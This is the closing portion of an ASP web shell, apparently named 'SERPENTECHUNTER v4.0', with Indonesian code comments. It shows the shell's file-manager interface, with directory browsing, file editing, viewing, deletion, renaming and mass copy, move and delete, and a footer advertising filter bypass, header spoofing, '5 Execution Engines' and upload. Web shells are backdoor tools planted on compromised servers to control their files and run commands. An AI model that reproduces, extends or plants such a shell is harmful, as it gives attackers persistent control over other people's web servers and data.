                </h3>
                <div class="file-list">
                    <% If IsArray(fileData) Then %>
                        <% For i = 0 To UBound(fileData) %>
                        <%
                            f = fileData(i)
                            Dim className, icon
                            If f(2) Then
                                className = "dir"
                                icon = "📁"
                            Else
                                className = ""
                                icon = "📄"
                            End If
                        %>
                        <div class="file-item">
                            <!-- PERUBAHAN: name="files" (tanpa kurung, tapi kita split koma) -->
                            <input type="checkbox" name="files" value="<%= Server.HTMLEncode(f(0)) %>" style="margin-right:8px;accent-color:#00ff00;">
                            <span class="name <%= className %>">
                                <%= icon %>
                                <% If f(2) Then %>
                                    <a href="?dir=<%= Server.URLEncode(f(1)) %>" style="color:#00aaff;text-decoration:none;"><%= Server.HTMLEncode(f(0)) %></a>
                                <% Else %>
                                    <a href="?action=edit&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" style="color:#00ff00;text-decoration:none;"><%= Server.HTMLEncode(f(0)) %></a>
                                <% End If %>
                            </span>
                            <span class="info"><%= f(3) %> | <%= f(4) %></span>
                            <span class="actions">
                                <% If Not f(2) Then %>
                                <a href="?action=edit&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" title="Edit">✏️</a>
                                <a href="?action=view&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" title="View">👁️</a>
                                <a href="#" onclick="singleDelete('<%= Server.URLEncode(f(0)) %>')" class="del" title="Delete">🗑️</a>
                                <a href="#" onclick="singleRename('<%= Server.URLEncode(f(0)) %>')" class="del" title="Rename">📝</a>
                                <% Else %>
                                <a href="#" onclick="singleDelete('<%= Server.URLEncode(f(0)) %>')" class="del" title="Delete Folder">🗑️</a>
                                <% End If %>
                            </span>
                        </div>
                        <% Next %>
                    <% Else %>
                        <p style="color:#ff4444;">❌ Directory not found</p>
                    <% End If %>
                </div>
                <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
                    <button type="submit" onclick="setMassAction('mass_delete');return confirm('Delete all selected?')" class="btn-danger">🗑️ DELETE</button>
                    <button type="button" onclick="massRename()" style="background:#ff8800;color:#000;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📝 RENAME</button>
                    <button type="button" onclick="massCopy()" style="background:#0088ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📋 COPY</button>
                    <button type="button" onclick="massMove()" style="background:#aa44ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📂 MOVE</button>
                </div>
            </div>
            <div class="panel editor">
                <!-- sama -->
            </div>
        </div>
    </form>
    <div class="footer">
        🐍 SERPENTECHUNTER v4.0 &nbsp;|&nbsp; ULTIMATE EDITION (FIXED BY ZAMZZZ)<br>
        <span style="font-size:10px;color:#444;">🔥 BYPASS: Base64 | Header Spoofing | 5 Execution Engines | Robust Upload</span>
    </div>
</div>
<script>
// Fungsi JavaScript untuk mass rename, copy, move (tetap, tapi kita sesuaikan agar mengirim "new_names" sebagai string koma)
function massRename() {
    var files = document.querySelectorAll('input[name="files"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    var newNames = [];
    var valid = true;
    files.forEach(function(cb) {
        var newName = prompt('New name for ' + cb.value, cb.value);
        if(newName === null) { valid = false; return; }
        newNames.push(newName);
    });
    if(!valid || newNames.length === 0) return;
    var form = document.getElementById('massActionForm');
    form.action = '?dir=<%= Server.URLEncode(cwd) %>&action=mass_rename';
    // Hapus input new_names[] lama jika ada
    var existing = form.querySelectorAll('input[name="new_names"]');
    existing.forEach(function(el){ el.remove(); });
    // Buat satu input hidden dengan nilai string koma
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = 'new_names';
    inp.value = newNames.join(',');
    form.appendChild(inp);
    form.submit();
}
// Function showToast, selectAll, deselectAll, setMassAction, singleDelete, singleRename, massCopy, massMove tetap sama.
</script>
</body>
</html>
